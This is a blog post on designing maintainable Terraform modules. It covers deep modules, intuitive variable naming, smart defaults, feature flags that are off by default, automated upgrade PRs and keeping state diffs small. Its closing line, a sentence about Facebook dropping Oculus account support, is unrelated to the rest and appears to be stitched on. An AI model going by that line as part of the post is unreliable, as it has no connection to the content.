<p>This blog post introduces some of the practices we developed while working on that Terraform module. “Better”, in this context means, <em>from the module user’s point of view</em>, easier to use and easier to maintain for a long period of time. Since the practices are very high level, some of them can be applied not only for the internal Terraform module but also for the public one and other software development like <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/">Kubernetes CRD</a> and so on…</p>

<p>When designing the Terraform module, the first and most important thing you need to aware of is the variable of the Terraform module is API. Once you define a variable in your module definition, it’s open to users and target to modification. This means it becomes an interface between users and your module. In this sense, you can think of it as API.</p>
<p>Since it’s API, what kind of variables you define decides the complexity and the usability of your module. But, fortunately, many practices have been developed for good API design in this industry. The followings are some of the practices from them and I think it’s important for Terraform module design.</p>
<h2 id="module-should-be-deep">Module should be deep</h2>
<p>The Terraform module is an abstraction of the collection of the raw Terraform resources. An abstraction, in general, is a simplified view of any entity, which omits unimportant details. We create a module to make it easier for your users to think about and manipulate complex resources.</p>
<p><img src="https://user-images.githubusercontent.com/1256183/96132088-eafb8400-0f34-11eb-90d1-3eebabfadf38.png" alt="Philosophy"></p>
<p>The best modules are those that provide powerful functionality yet have a simple interface. In the book, <a href="https://www.amazon.com/dp/B07N1XLQ7D">A Philosophy of Software Design</a> calls this “Deep module” (The word “module” is used for different context and not about Terraform module but you can think of them same). You can see the visualized notion of this above. “Deep” means they have lots of functionality hidden behind a simple interface. On the other hand, “Shallow module” is one whose interface is relatively complex in comparison to the functionality that provides (does not hide much complexity).</p>
<p>The module’s interface represents the complexity of that module imposes to the user: the smaller and simpler the interface, the less complexity that it introduces. When designing your Terraform module, always think about the depth of it.</p>
<p>Be careful that once you open your interface and it’s used by users, you can not change or delete it easily.  And it may be used in an unexpected way (See <a href="https://www.hyrumslaw.com/">Hyrum’s Law</a>). So what variable to expose is really important.</p>
<p>You can more learn about interface design from e.g., <a href="https://increment.com/apis/consider-the-interface-api-redesign/">Consider the interface</a>.</p>
<h2 id="interface-should-be-intuitive">Interface should be intuitive</h2>
<p>The module interface = <code>variable</code> should be intuitive to use. What happens when changing the variable should be obvious and predictable to your users. Don’t surprise your users. For example, avoid using the <code>enable_x</code> variable for enabling features not related to x.</p>
<p>Using consistent naming and format in the same module is also important to make it intuitive. For example, if the module uses the <code>enable_x</code> variable for enabling feature “x”, then enabling “y” should be also done by the <code>enable_y</code> variable, not by <code>setup_y</code> or <code>use_y</code>.</p>
<h2 id="variable-should-have-smart-default">Variable should have smart default</h2>
<p>The module variable should have a smart default value which covers 80% of users. The smart value means the best value in a limited context. The module which can be used without any configuration is the best (It also related to the upgrading strategy below). You should design carefully what default value it should have.</p>
<p>But, at the same time, it should have configuration knobs for the power users. Normally, you have the power users who can not use the module like the 80% of normal users. For such users, you should prepare ways of changing the behavior of the module. This knob should be designed properly and avoid having a shallow interface.</p>

<p>Upgrading is one of the most critical tasks of long-developing software. But, at the same time, it’s also the most bothering task. This is also true for the Terraform module, especially which is for the general purpose and widely used… It’s been huge problem for our Terraform module, too.</p>
<p>Since normally new features are added to the latest version, if you want your users to use the feature, you need to ask them to upgrade it. To make it works, upgrading must be easy as possible and less cost to users.</p>
<p>To make upgrading easy, <em>keeping backward compatibility</em> is most important. In the case of the Terraform module, if there is no Terraform state diff when upgrading the module version, it keeps backward compatibility. If there is no state diff, users do not need to care about anything when upgrading. So the best upgrading is no Terraform state diff.</p>
<p>The following practices are the idea of achieving this and reducing the cost of upgrading.</p>
<h2 id="new-functionality-should-be-off-by-default">New functionality should be off by default</h2>
<p>If you want to introduce new functionality to your module, you should make the feature “off” by default. It should be explicitly “on” by the users who want to use it.</p>
<p>Sometimes, you want to enforce all your users to use some features by default. Even in that case, you should do it gradually. When introducing, it should be “off” by default. Then you should ask users to enable it explicitly. After the feature adaption rate is increased (you should monitor it), then you can make it “on” by default. With this, you can reduce the effect of upgrading.</p>
<h2 id="upgrading-should-be-automated">Upgrading should be automated</h2>
<p>In other words, prepare <a href="https://dependabot.com/">dependabot</a> for your module. Especially, if you update the module frequently, you must prepare it. Even if you ask your users to upgrade, normally they don’t work on because normally they have more important tasks to do. We struggled with this a lot. So, instead, create PRs for them.</p>
<p>Internally, not only we send PRs of new version upgrading, but also we have the mechanism to automatically merge the PR if there is no Terraform diff. With the combination of this and <em>keeping backward compatibility</em> practice, we can increase the rate of users who use the latest version of the module.</p>
<h2 id="state-diff-should-be-small-as-possible">State diff should be small as possible</h2>
<p>It’s not possible to make upgrading no state diff always. Sometimes you need to introduce breaking changes e.g., because of changes in dependent resources or security issues needed to be patched as soon as possible.  In that case, you must think about how to reduce the cost. If the state diff is less, then the cost of upgrading is less. The more you include diff, the fewer chances users upgrade it.</p>
<p>When introducing the breaking changes, you must tell it by the documentation. The documentation can be <a href="https://keepachangelog.com/en/1.0.0/">CHANGELOG</a> or your user guides. If the documentation clearly describes the changes or the actions users need to take, the cost of upgrading decreases. For example, if the documentation shows what kind of state diff is expected in the documentation, the users can upgrade it without fear.</p>

This will only work for so long; Facebook have confirmed that they will drop all support for Oculus accounts in 2023.
